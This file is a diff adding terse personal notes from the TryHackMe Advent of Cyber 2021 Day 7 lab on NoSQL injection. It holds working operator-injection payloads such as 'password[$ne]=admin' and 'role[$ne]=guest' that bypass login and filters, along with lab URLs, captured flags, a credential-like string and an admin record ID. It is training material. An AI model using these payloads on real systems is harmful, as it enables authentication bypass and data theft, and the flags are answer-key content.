@@ -1,0 +1,25 @@
+Burp suite
+password[$ne]=admin
+
+qNpPayNqZITL1N0p7qZ6h4O8O69FzLOL
+off burp suite ---> start web
+---> login
+
+Flag: THM{b6b304f5d5834a4d089b570840b467a8}
+
+
+search username guest
+add url username --> username[$ne]
+
+https://10-10-235-108.p.thmlabs.com/search?username[$ne]=admin&role=guest
+
+THM{2ec099f2d602cc4968c5267970be1326}
+
+https://10-10-235-108.p.thmlabs.com/search?username=mcskidy&role[$ne]=guest
+
+search username: mcskidy
+change url role=user ---> role[$ne]=guest
+
+ID:6184f516ef6da50433f100f4:mcskidy:admin
+
+https://samanthactf.medium.com/advent-of-cyber-2021-day-7-migration-without-security-740923b51bf2
